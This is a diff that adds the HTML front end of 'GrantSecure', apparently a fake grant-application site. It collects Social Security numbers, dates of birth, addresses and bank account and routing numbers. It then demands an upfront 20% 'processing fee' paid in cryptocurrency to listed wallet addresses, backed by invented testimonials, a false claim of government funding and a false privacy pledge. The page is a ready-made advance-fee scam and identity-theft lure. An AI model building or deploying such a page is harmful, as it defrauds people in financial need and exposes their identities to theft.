@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="style.css" />
+    <title>Document</title>
+  </head>
+  <body>
+    <header>
+      <div class="container header-content">
+        <div class="logo">GrantSecure</div>
+        <nav>
+          <ul>
+            <li><a href="#" class="nav-link" data-page="home">Home</a></li>
+            <li><a href="#" class="nav-link" data-page="about">About</a></li>
+            <li><a href="#" class="nav-link" data-page="apply">Apply</a></li>
+            <li>
+              <a href="#" class="nav-link" data-page="contact">Contact</a>
+            </li>
+          </ul>
+        </nav>
+        <div class="auth-buttons">
+          <button id="loginBtn">Login</button>
+          <button id="registerBtn">Register</button>
+        </div>
+      </div>
+    </header>
+
+    <!-- Home Page -->
+    <section class="page active" id="home-page">
+      <section class="hero" id="home">
+        <div class="container">
+          <h1>Secure Grant Program Application</h1>
+          <p>
+            Apply for financial assistance through our secure platform. Your
+            privacy and data security are our top priorities.
+          </p>
+        </div>
+      </section>
+
+      <div class="container">
+        <!-- Application Form Section -->
+        <section class="section" id="apply">
+          <h2>Grant Application Form</h2>
+          <div class="alert alert-info">
+            <strong>Important:</strong> You must register for an account before
+            submitting your application. This ensures your data is securely
+            stored and you can track your application status.
+          </div>
+          <form id="grantForm">
+            <div class="form-row">
+              <div class="form-col">
+                <div class="form-group">
+                  <label for="firstName">First Name</label>
+                  <input type="text" id="firstName" name="firstName" required />
+                </div>
+              </div>
+              <div class="form-col">
+                <div class="form-group">
+                  <label for="lastName">Last Name</label>
+                  <input type="text" id="lastName" name="lastName" required />
+                </div>
+              </div>
+            </div>
+
+            <div class="form-row">
+              <div class="form-col">
+                <div class="form-group">
+                  <label for="dob">Date of Birth</label>
+                  <input type="date" id="dob" name="dob" required />
+                </div>
+              </div>
+              <div class="form-col">
+                <div class="form-group">
+                  <label for="ssn">Social Security Number (SSN)</label>
+                  <input
+                    type="text"
+                    id="ssn"
+                    name="ssn"
+                    placeholder="XXX-XX-XXXX"
+                    required
+                  />
+                </div>
+              </div>
+            </div>
+
+            <div class="form-group">
+              <label for="address">House Address</label>
+              <input type="text" id="address" name="address" required />
+            </div>
+
+            <div class="form-row">
+              <div class="form-col">
+                <div class="form-group">
+                  <label for="phone">Phone Number</label>
+                  <input type="tel" id="phone" name="phone" required />
+                </div>
+              </div>
+              <div class="form-col">
+                <div class="form-group">
+                  <label for="amount">Amount You Wish to Claim ($)</label>
+                  <input
+                    type="number"
+                    id="amount"
+                    name="amount"
+                    min="1000"
+                    max="100000"
+                    required
+                  />
+                  <small>Minimum: $1,000 | Maximum: $100,000</small>
+                </div>
+              </div>
+            </div>
+
+            <div class="form-group">
+              <label for="reason">Reason for Grant Request</label>
+              <textarea
+                id="reason"
+                name="reason"
+                rows="4"
+                placeholder="Please explain why you need this grant and how it will help you..."
+                required
+              ></textarea>
+            </div>
+
+            <div class="privacy-policy">
+              <h3>Privacy & Security Policy</h3>
+              <p>
+                We take your privacy and security seriously. By submitting this
+                application, you agree to the following:
+              </p>
+              <ul>
+                <li>
+                  All personal information provided will be encrypted and stored
+                  securely
+                </li>
+                <li>
+                  We will not disclose your information to any third parties
+                  without your explicit consent
+                </li>
+                <li>
+                  Your SSN and financial details are protected with bank-level
+                  security measures
+                </li>
+                <li>
+                  We implement strict protocols to prevent identity theft and
+                  fraud
+                </li>
+                <li>
+                  You will receive confirmation of your application via secure
+                  channels
+                </li>
+              </ul>
+              <div class="form-group">
+                <input
+                  type="checkbox"
+                  id="agreePolicy"
+                  name="agreePolicy"
+                  required
+                />
+                <label for="agreePolicy"
+                  >I have read and agree to the Privacy & Security Policy</label
+                >
+              </div>
+            </div>
+
+            <button type="submit" class="btn btn-block">
+              Submit Application
+            </button>
+          </form>
+        </section>
+
+        <!-- Dashboard Section (Initially Hidden) -->
+        <section class="section dashboard" id="dashboard">
+          <div class="dashboard-header">
+            <div class="welcome-message">
+              Welcome, <span id="userName">User</span>!
+            </div>
+            <button class="btn" id="logoutBtn">Logout</button>
+          </div>
+
+          <div class="alert alert-info">
+            Your application is being processed. Below are your grant details.
+          </div>
+
+          <div class="dashboard-card">
+            <h3 class="card-title">Grant Status</h3>
+            <p>
+              <strong>Application ID:</strong>
+              <span id="appId">GR-2023-001</span>
+            </p>
+            <p>
+              <strong>Status:</strong>
+              <span id="appStatus" style="color: var(--warning)"
+                >Pending Payment</span
+              >
+            </p>
+            <p>
+              <strong>Submitted:</strong>
+              <span id="submissionDate">October 15, 2023</span>
+            </p>
+          </div>
+
+          <div class="dashboard-card">
+            <h3 class="card-title">Grant Amount</h3>
+            <div class="amount-display" id="grantAmount">$5,000.00</div>
+            <p>
+              The amount you are eligible to claim based on your application.
+            </p>
+
+            <div class="amount-range">
+              <label for="adjustAmount">Adjust Amount (if needed):</label>
+              <input
+                type="range"
+                id="adjustAmount"
+                name="adjustAmount"
+                min="1000"
+                max="100000"
+                step="1000"
+                value="5000"
+              />
+              <span id="adjustedAmountDisplay">$5,000</span>
+            </div>
+            <button class="btn" id="updateAmount">Update Amount</button>
+          </div>
+
+          <div class="dashboard-card">
+            <h3 class="card-title">Payment of Fee</h3>
+
+            <div class="fee-breakdown">
+              <h4>Fee Breakdown</h4>
+              <div class="fee-item">
+                <span>Grant Amount:</span>
+                <span id="displayAmount">$0.00</span>
+              </div>
+              <div class="fee-item">
+                <span>Processing Fee (20%):</span>
+                <span id="displayFee">$0.00</span>
+              </div>
+              <div class="fee-item fee-total">
+                <span>Net Amount After Fee:</span>
+                <span id="displayNetAmount">$0.00</span>
+              </div>
+            </div>
+
+            <div class="tab-container">
+              <div class="tabs">
+                <div class="tab active" data-tab="cash">Cash Delivery</div>
+                <div class="tab" data-tab="transfer">Bank Transfer</div>
+                <div class="tab crypto" data-tab="crypto">Cryptocurrency</div>
+              </div>
+
+              <div class="tab-content active" id="cash-tab">
+                <h4>Cash Delivery via FedEx</h4>
+                <p>
+                  Your funds will be delivered in cash via FedEx to your
+                  registered address. Delivery typically takes 3-5 business
+                  days.
+                </p>
+                <p>
+                  <strong>Delivery Address:</strong>
+                  <span id="deliveryAddress">123 Main St, Anytown, USA</span>
+                </p>
+                <button class="btn" id="confirmCash">
+                  Confirm Cash Delivery
+                </button>
+              </div>
+
+              <div class="tab-content" id="transfer-tab">
+                <h4>Bank Transfer</h4>
+                <p>Provide your bank details for direct transfer of funds.</p>
+                <form id="bankForm">
+                  <div class="form-group">
+                    <label for="bankName">Bank Name</label>
+                    <input type="text" id="bankName" name="bankName" />
+                  </div>
+                  <div class="form-group">
+                    <label for="accountNumber">Account Number</label>
+                    <input
+                      type="text"
+                      id="accountNumber"
+                      name="accountNumber"
+                    />
+                  </div>
+                  <div class="form-group">
+                    <label for="routingNumber">Routing Number</label>
+                    <input
+                      type="text"
+                      id="routingNumber"
+                      name="routingNumber"
+                    />
+                  </div>
+                  <button type="submit" class="btn">
+                    Confirm Bank Transfer
+                  </button>
+                </form>
+              </div>
+
+              <div class="tab-content" id="crypto-tab">
+                <h4>Cryptocurrency Payment</h4>
+                <p>
+                  Pay the processing fee using cryptocurrency. Once payment is
+                  confirmed, your grant will be processed.
+                </p>
+
+                <div class="payment-options">
+                  <div
+                    class="payment-option crypto selected"
+                    data-crypto="bitcoin"
+                  >
+                    <h4>Bitcoin (BTC)</h4>
+                    <p>
+                      Send exactly <strong id="btcAmount">0.025 BTC</strong> to
+                      the address below:
+                    </p>
+                    <div class="crypto-address" id="btcAddress">
+                      1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+                    </div>
+                    <button
+                      class="btn btn-copy"
+                      data-address="1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+                    >
+                      Copy Address
+                    </button>
+                    <div class="qr-code">
+                      <img
+                        src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=bitcoin:1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+                        alt="Bitcoin QR Code"
+                      />
+                    </div>
+                    <p>Network: Bitcoin Mainnet</p>
+                  </div>
+                  <div class="payment-option crypto" data-crypto="ethereum">
+                    <h4>Ethereum (ETH)</h4>
+                    <p>
+                      Send exactly <strong id="ethAmount">0.5 ETH</strong> to
+                      the address below:
+                    </p>
+                    <div class="crypto-address" id="ethAddress">
+                      0x742d35Cc6634C0532925a3b844Bc454e4438f44e
+                    </div>
+                    <button
+                      class="btn btn-copy"
+                      data-address="0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
+                    >
+                      Copy Address
+                    </button>
+                    <div class="qr-code">
+                      <img
+                        src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=ethereum:0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
+                        alt="Ethereum QR Code"
+                      />
+                    </div>
+                    <p>Network: Ethereum Mainnet</p>
+                  </div>
+                  <div class="payment-option crypto" data-crypto="usdt">
+                    <h4>USDT (ERC-20)</h4>
+                    <p>
+                      Send exactly <strong id="usdtAmount">1000 USDT</strong> to
+                      the address below:
+                    </p>
+                    <div class="crypto-address" id="usdtAddress">
+                      0x742d35Cc6634C0532925a3b844Bc454e4438f44e
+                    </div>
+                    <button
+                      class="btn btn-copy"
+                      data-address="0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
+                    >
+                      Copy Address
+                    </button>
+                    <div class="qr-code">
+                      <img
+                        src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=ethereum:0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
+                        alt="USDT QR Code"
+                      />
+                    </div>
+                    <p>Network: Ethereum Mainnet (ERC-20)</p>
+                  </div>
+                </div>
+
+                <div class="form-group">
+                  <label for="receipt">Upload Payment Receipt</label>
+                  <input
+                    type="file"
+                    id="receipt"
+                    name="receipt"
+                    accept="image/*,.pdf"
+                  />
+                </div>
+
+                <button class="btn btn-crypto" id="confirmCrypto">
+                  Confirm Cryptocurrency Payment
+                </button>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Contact Section -->
+        <section class="section" id="contact">
+          <h2>Contact Us</h2>
+          <p>
+            If you have any questions about our grant program or need assistance
+            with your application, please don't hesitate to contact us:
+          </p>
+          <p><strong>Email:</strong> support@grantsecure.com</p>
+          <p><strong>Phone:</strong> 1-800-GRANT-SECURE</p>
+          <p><strong>Address:</strong> 123 Security Lane, Safetown, ST 12345</p>
+        </section>
+      </div>
+    </section>
+
+    <!-- About Page -->
+    <section class="page" id="about-page">
+      <section class="hero">
+        <div class="container">
+          <h1>About Our Grant Program</h1>
+          <p>
+            Learn more about our mission, eligibility criteria, and success
+            stories
+          </p>
+        </div>
+      </section>
+
+      <div class="container">
+        <section class="section">
+          <h2>Our Mission</h2>
+          <div class="grant-details">
+            <p>
+              The GrantSecure program is dedicated to providing financial
+              assistance to individuals and businesses in need. Our mission is
+              to empower communities by offering grants that help people achieve
+              their personal and professional goals.
+            </p>
+            <p>
+              This program is funded by government initiatives and major NGOs
+              committed to giving back to their communities. We believe in
+              creating opportunities for growth and development through
+              financial support.
+            </p>
+          </div>
+        </section>
+
+        <section class="section">
+          <h2>Eligibility Criteria</h2>
+          <div class="eligibility-criteria">
+            <p>
+              Our grant program is open to a wide range of applicants. You may
+              be eligible if you fall into one of these categories:
+            </p>
+            <ul class="criteria-list">
+              <li>Small business owners seeking expansion capital</li>
+              <li>Entrepreneurs starting new businesses</li>
+              <li>
+                Individuals facing financial hardship due to medical expenses
+              </li>
+              <li>Students pursuing higher education</li>
+              <li>Homeowners needing assistance with housing costs</li>
+              <li>Non-profit organizations serving community needs</li>
+              <li>Artists and creators seeking project funding</li>
+              <li>Individuals affected by natural disasters</li>
+              <li>Single parents needing financial support</li>
+              <li>Veterans transitioning to civilian life</li>
+            </ul>
+            <p>
+              Each application is reviewed individually, and decisions are based
+              on both financial need and potential impact.
+            </p>
+          </div>
+        </section>
+
+        <section class="section">
+          <h2>Success Stories</h2>
+          <div class="testimonials">
+            <div class="testimonial">
+              <div class="testimonial-text">
+                "The grant I received allowed me to expand my bakery business. I
+                was able to hire two additional employees and purchase new
+                equipment. My revenue has increased by 60% in just six months!"
+              </div>
+              <div class="testimonial-author">
+                - Maria Gonzalez, Small Business Owner
+              </div>
+            </div>
+            <div class="testimonial">
+              <div class="testimonial-text">
+                "After losing my job during the pandemic, this grant helped me
+                start my own consulting business. I'm now financially stable and
+                able to support my family while doing work I love."
+              </div>
+              <div class="testimonial-author">- James Wilson, Entrepreneur</div>
+            </div>
+            <div class="testimonial">
+              <div class="testimonial-text">
+                "Thanks to the educational grant, I was able to complete my
+                nursing degree without accumulating massive student debt. I'm
+                now working at a local hospital and giving back to my
+                community."
+              </div>
+              <div class="testimonial-author">
+                - Sarah Johnson, Nursing Graduate
+              </div>
+            </div>
+            <div class="testimonial">
+              <div class="testimonial-text">
+                "The housing grant helped me make a down payment on my first
+                home. As a single parent, this was a dream I thought was years
+                away. Now my children have a stable place to grow up."
+              </div>
+              <div class="testimonial-author">- David Chen, Homeowner</div>
+            </div>
+            <div class="testimonial">
+              <div class="testimonial-text">
+                "Our community center received a grant that allowed us to expand
+                our programs for at-risk youth. We've seen a significant
+                decrease in local juvenile crime rates since implementing these
+                new initiatives."
+              </div>
+              <div class="testimonial-author">
+                - Rev. Michael Brown, Community Leader
+              </div>
+            </div>
+            <div class="testimonial">
+              <div class="testimonial-text">
+                "The agricultural grant transformed my small farm. I was able to
+                invest in sustainable irrigation systems and double my crop
+                yield. I'm now supplying fresh produce to three local schools."
+              </div>
+              <div class="testimonial-author">- Robert Davis, Farmer</div>
+            </div>
+          </div>
+        </section>
+      </div>
+    </section>
+
+    <!-- Chat Bot -->
+    <div class="chat-bot">
+      <button class="chat-bot-btn" id="chatBotBtn">💬</button>
+      <div class="chat-bot-window" id="chatBotWindow">
+        <div class="chat-header">
+          <h3>Grant Support</h3>
+        </div>
+        <div class="chat-messages" id="chatMessages">
+          <div class="message bot-message">
+            Hello! How can I help you with your grant application today?
+          </div>
+        </div>
+        <div class="chat-input">
+          <input
+            type="text"
+            id="chatInput"
+            placeholder="Type your message..."
+          />
+          <button class="btn" id="sendMessage">Send</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Login Modal -->
+    <div class="modal" id="loginModal">
+      <div class="modal-content">
+        <span class="close-modal">&times;</span>
+        <h2>Login to Your Account</h2>
+        <form id="loginForm">
+          <div class="form-group">
+            <label for="loginEmail">Email</label>
+            <input type="email" id="loginEmail" name="loginEmail" required />
+          </div>
+          <div class="form-group">
+            <label for="loginPassword">Password</label>
+            <input
+              type="password"
+              id="loginPassword"
+              name="loginPassword"
+              required
+            />
+          </div>
+          <button type="submit" class="btn btn-block">Login</button>
+        </form>
+      </div>
+    </div>
+
+    <!-- Registration Modal -->
+    <div class="modal" id="registerModal">
+      <div class="modal-content">
+        <span class="close-modal">&times;</span>
+        <h2>Create an Account</h2>
+        <p>
+          You need to register before submitting your grant application. This
+          allows you to securely save your application and track its status.
+        </p>
+        <form id="registerForm">
+          <div class="form-group">
+            <label for="regFirstName">First Name</label>
+            <input type="text" id="regFirstName" name="regFirstName" required />
+          </div>
+          <div class="form-group">
+            <label for="regLastName">Last Name</label>
+            <input type="text" id="regLastName" name="regLastName" required />
+          </div>
+          <div class="form-group">
+            <label for="regEmail">Email</label>
+            <input type="email" id="regEmail" name="regEmail" required />
+          </div>
+          <div class="form-group">
+            <label for="regPassword">Password</label>
+            <input
+              type="password"
+              id="regPassword"
+              name="regPassword"
+              required
+            />
+          </div>
+          <div class="form-group">
+            <label for="confirmPassword">Confirm Password</label>
+            <input
+              type="password"
+              id="confirmPassword"
+              name="confirmPassword"
+              required
+            />
+          </div>
+          <button type="submit" class="btn btn-block">Register</button>
+        </form>
+      </div>
+    </div>
+
+    <footer>
+      <div class="container">
+        <p>
+          &copy; 2023 GrantSecure. All rights reserved. |
+          <a href="#" style="color: white">Privacy Policy</a> |
+          <a href="#" style="color: white">Terms of Service</a>
+        </p>
+      </div>
+    </footer>
+
+    <script src="script.js"></script>
+  </body>
+</html>
